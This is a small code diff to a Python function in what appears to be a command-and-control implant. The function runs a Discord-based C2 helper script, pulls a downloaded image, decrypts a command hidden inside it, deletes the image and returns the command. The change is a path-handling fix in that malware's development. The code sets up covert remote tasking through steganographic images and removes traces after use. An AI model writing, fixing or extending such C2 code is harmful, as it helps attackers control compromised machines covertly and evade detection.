@@ -48,9 +48,9 @@ def unwrap_command(embedded_command, key):
 def fetch_command():
     filepath = resource_path('c2_discord.py')
     os.system(f'python3 {filepath}')
-    if exists(resource_path(secrets["IMAGE_DOWNLOAD_PATH"])):
-        command = unwrap_command(resource_path(secrets["IMAGE_DOWNLOAD_PATH"]), secrets["ENCRYPTION_KEY"])
-        os.remove(resource_path(secrets["IMAGE_DOWNLOAD_PATH"]))
+    if exists(secrets["IMAGE_DOWNLOAD_PATH"]):
+        command = unwrap_command(secrets["IMAGE_DOWNLOAD_PATH"], secrets["ENCRYPTION_KEY"])
+        os.remove(secrets["IMAGE_DOWNLOAD_PATH"])
     else:
         command = None
     return command
